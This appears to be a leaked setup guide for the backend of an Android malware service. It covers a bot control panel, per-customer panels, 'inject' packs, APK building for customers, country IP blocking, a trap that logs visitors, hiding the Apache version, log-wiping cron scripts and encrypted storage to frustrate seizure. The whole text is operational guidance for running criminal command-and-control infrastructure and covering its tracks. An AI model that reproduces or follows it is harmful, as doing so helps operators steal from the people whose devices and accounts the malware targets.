
Backend main server setup


- use debian 64, 8 gb RAM at least, 20 gb HDD at least (SSD will be better)

You have to install apache 2, mysql server, php 5.4 or newer, phpmyadmin (optionally)
Enable rewrite and ssl mods in apache 

- put all in /var/data, not in /var/www

- you can hide entire '/var/data' folder into veracrypt container and mount it to /var/data then. But take a note that you have to re-mount it manually with a password after each server reboot.
So better to use servers with full hdd crypted.



Structure:

/var/data/
	apache_ip_block/ - apache configs to block countries by ip range (see README there)
	sites-enabled/ - apache configs for virtualhosts
		bot - main bot panel
		cp - admin control panel to manage customers, their injects, etc
		rpaf - to support provide real client ip address to backend panel (you must set FRONTEND ip there - replace 'FRONTEND_IP' word with real ip address)
		hide_apache_ver - just to hide version from apache pages
		
	backend_backup.sh - script to make backup (can be added to crontab)
	customers.passwd - basic authorization for all customers
	panel.passwd - basic authorization for admin panel
	remove_logs.sh - clean logs on the server (can be added to crontab)

	www/
		apks/ - compiled apk files for all customers (can be downloaded from their panels)
		base/bot/ - panel sources, dynamic modules should be placed in bot_mods/
		bot/ - symlinks to clients/. This directory is accessible as server www root -- see sites-enabled/bot.conf
		clients/ - customers panels. Each panel is copy of the blank/ template.
			trap - just a trap to log users who went to the link https://backend/adminsdfsdf/111 -- it will be noticed in admin panel
					trap link is set in frontend nginx config, that installs with frontend_server/setup_client_vps.sh
					
			! All panels should be created from admin panel, not manually !
		
		cp/ - admin panel, accessible on custom port 							-- see sites-enabled/cp.conf
			! Builder server connect to cp/builder.php, with basic authorization. 
			So basic auth to access this panel and file should be specified in Builder configuration file (on Builder server) 
			Admin panel usage - see below 
	
Setup:


- Setup db as listed in SQL/README.txt

- Setup config in www/clients/panel2/bot/config_1111.php
- Update include path to directory that contains core.php (www/base/bot/)

NOTE: blank and trap in www/clients is a system account, DO NOT REMOVE them

- install www/base/bot/aapt/INSTALL.txt to show apk package names
	set execute permission to aapt binary: chmod +x /var/data/www/base/bot/aapt/aapt
	
- Add credentials to customers.passwd with a command: 

	htacess -cb customers.passwd LOGIN PASS

where LOGIN is client folder name ('panel2' by default)

- generate user password for the panel:
	php -r "echo md5('PASSWORD' . 'SALT');"
where SALT should be taken from the panel config.php file

Point apache to use /var/data/sites-enabled/ as main virtualhosts folder
Setup all exactly to match sites-enabled/* settings. 
Do not change these config files - it can prevent to some scripts do its work.

- open admin panel, add new customer
- find customer in customers list, edit his injects list to enable or disable inject packs

	
Admin panel usage:
	
First of all - it tests server config and shows debug data at top

Menu:

- add customer -- form to add new customer (it will create panel and database for him)
	"add mods" panel is not used
	After adding the customer you can use "Import client" in Builder top menu - to add him fast and Build apk (with auto-uploading to his panel)

- customers -- list of all customers. "Light mode" - disables some functions in panel. Other checkboxes is not used.
	"Edit injects" allow to add/remove injects in bot panel.
	
- backups -- listing of the directory to download and delete backups
- injects list -- all injects with screenshots and edit form
- add injects -- just a form to mass add injects records into 'general' database
- tokens, coordinates - not used
